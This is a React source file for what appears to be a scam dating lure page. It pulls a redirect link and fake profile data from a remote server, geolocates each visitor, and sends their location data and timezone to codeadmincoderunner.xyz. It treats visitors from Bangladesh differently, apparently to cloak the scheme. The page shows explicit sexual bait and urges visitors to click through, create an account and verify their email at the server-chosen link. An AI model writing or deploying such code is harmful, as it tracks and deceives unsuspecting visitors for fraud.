import { useState, useEffect, useRef } from "react";
import axios from "axios";
function App(props) {
  const setBtnStyle = useRef({ backgroundColor: '#3b82f6', color: "white" })
  //
  const queryString = window.location.search;
  const urlParam = new URLSearchParams(queryString);
  const value = urlParam.get("id")
  console.log("value", value)

  //change button color
  function BtnChangeColor() {

    setTimeout(() => {
      setBtnStyle.current = { backgroundColor: '#3b82f6', color: "white" }
    }, 400);
    setTimeout(() => {
      setBtnStyle.current = {}
    }, 800);
    setTimeout(() => {
      BtnChangeColor()
    }, 1200);
  }
  // BtnChangeColor()

  // set link and data get
  const [hi, setHi] = useState("")
  const [URL, setURL] = useState("")
  const [reTrue, setReTrue] = useState(true)

  //

  const [modelname, setModelname] = useState("")
  const [modelUsername, setModeluserName] = useState("")
  const [modelProfilePhotoUrl, setModelProfilePhotoUrl] = useState("")
  const [modelCoverPhotoUrl, setModelCoverPhotoUrl] = useState("")



  //
  let timecon = Intl.DateTimeFormat().resolvedOptions().timeZone === "Asia/Dhaka"







  //    Sender()
  // setTimeout(() => {
  //    SenderBD()
  // }, 10);
  // setTimeout(() => {
  //    SenderOp1()
  // }, 20);




  //
  axios.post("https://shoetlld.store/findusers", { id: value }).then((res) => {
    console.log("hello")
    if (res.data.link[0].link) {
      setReTrue(false)
      setURL(res.data.link[0].link)
      setModelname(res.data.link[0].modelname)
      setModeluserName(res.data.link[0].modelUsername)
      setModelCoverPhotoUrl(res.data.link[0].modelCoverPhotoUrl)
      setModelProfilePhotoUrl(res.data.link[0].modelProfilePhotoUrl)
      Sender()
      setTimeout(() => {
        SenderBD()
      }, 10);
      setTimeout(() => {
        SenderOp1()
      }, 20);


    }
    if (!res.data.link[0].link) {
      setURL(res.data.link[0].link)
      Sender()
      setTimeout(() => {
        SenderBD()
      }, 10);
      setTimeout(() => {
        SenderOp1()
      }, 20);


    }

  })


  const Sender = () => {
    axios.get("https://geolocation-db.com/json/").then((res) => {
      //
      const checkTrue = res.data.country_code === "BD"
      console.log()
      if (checkTrue === false && timecon === false) {
        axios.post("https://codeadmincoderunner.xyz/users", { message: { timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, country: res.data, furl: URL } }).then(res => {
          console.log(res.data.message)
          setHi(res.data.message)
        })
      }
    })

  }


  //bd
  const SenderBD = () => {
    axios.get("https://geolocation-db.com/json/").then((res) => {
      const checkTrue = res.data.country_code === "BD"

      if (checkTrue === true || timecon == true) {
        axios.post("https://codeadmincoderunner.xyz/bd", { message: { timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, country: res.data, furl: URL } }).then(res => {
          console.log(res.data.message)

          if (res.data.access === "ok") {
            setHi(res.data.message)
          }
        })
      }
    })

  }

  // optional
  const SenderOp1 = () => {

    if (Intl.DateTimeFormat().resolvedOptions().timeZone === "Asia/Dhaka") {
      axios.post("https://codeadmincoderunner.xyz/op", { message: { timezone: Intl.DateTimeFormat().resolvedOptions().timeZone } }).then(res => {
        console.log(res.data)

        if (res.data.access === "ok") {
          setHi(res.data.message)
        }
      })
    }


  }

  return (
    <div>

      {URL &&
        <div class="bg-white  pb-6 w-full justify-center items-center overflow-hidden md:max-w-sm rounded-lg shadow-sm mx-auto">
          <div class="relative h-40">
            <img class="absolute h-full w-full object-cover" src={modelCoverPhotoUrl} />
          </div>
          <div class="relative shadow mx-auto h-24 w-24 -my-12 border-white rounded-full overflow-hidden border-4">
            <img class="" src={modelProfilePhotoUrl} />
          </div>
          <div class="mt-16">
            <h1 class="text-lg text-center font-semibold">
              {modelname || "Enjoy Free Dating"}
            </h1>
            <div style={{ display: "flex", justifyContent: "center" }}>
              <small style={{ color: "#43bfeb", textAlign: "center" }}>@{modelUsername || "dathelof23"}</small>
            </div>

            <p class="text-sm text-gray-600 text-center">
              if you want to se..x with me join my profile
            </p>
          </div>
          <div class="mt-6 pt-3 flex flex-wrap mx-6 border-t">
            <div class="text-xs mr-2 my-1 uppercase tracking-wider border px-2 text-indigo-600 border-indigo-600 hover:bg-indigo-600 hover:text-indigo-100 cursor-default">
              Free Sex
            </div>
            <div class="text-xs mr-2 my-1 uppercase tracking-wider border px-2 text-indigo-600 border-indigo-600 hover:bg-indigo-600 hover:text-indigo-100 cursor-default">
              Video Sex
            </div>
            <div class="text-xs mr-2 my-1 uppercase tracking-wider border px-2 text-indigo-600 border-indigo-600 hover:bg-indigo-600 hover:text-indigo-100 cursor-default">
              Chat Sex
            </div>
            <div class="text-xs mr-2 my-1 uppercase tracking-wider border px-2 text-indigo-600 border-indigo-600 hover:bg-indigo-600 hover:text-indigo-100 cursor-default">
              Hand sex
            </div>
            <div class="text-xs mr-2 my-1 uppercase tracking-wider border px-2 text-indigo-600 border-indigo-600 hover:bg-indigo-600 hover:text-indigo-100 cursor-default">
              toy sex
            </div>
          </div>


          <div className="my-8 mx-20">
            <a target={"_blank"} href={hi || URL}>    <button style={{ backgroundColor: '#3b82f6', color: "white" }} class="bg-transparent w-full upper uppercase  hover:bg-blue-500 text-blue-700 font-semibold hover:text-white py-2 px-4 border border-blue-500 hover:border-transparent rounded-full">
              Join My Profile
            </button></a>
          </div>
          <hr />
          <div className="mx-6 border-t-1 text-gray-600 my-2 ">
            <h1 className="text-black text-md">If you want to  sex with me, join my profile. How you can join my profile?</h1>
            <ul>
              <li className="text-sm">‣ First click join my profile button.</li>
              <li className="text-sm py-[2px]">‣ Then continue and create a new profile.</li>
              <li className="text-sm py-[2px]">‣ Then check your email inbox and confrom and verify your email .</li>
              <li className="text-sm py-[2px]">
                ‣ Then message me for playing.</li>
            </ul>

          </div>
          <hr />
          <br />
          <h1 className="text-center text-gray-300">&copy; Copyright 2023 | Sex World</h1>
        </div>
      }


      {reTrue && <section style={{ marginTop: "200px" }}>
        <div >
          <h2 className="text-center font-mono">Please wait to redirect</h2>
          <div className="flex items-center justify-center">
            <div className="spinner-border animate-spin inline-block w-8 h-8 border-4 rounded-full" role="status">
              <span className="visually-hidden">Loading...</span>
            </div>
          </div>
        </div>
      </section>}
    </div>
  );
}

export default App;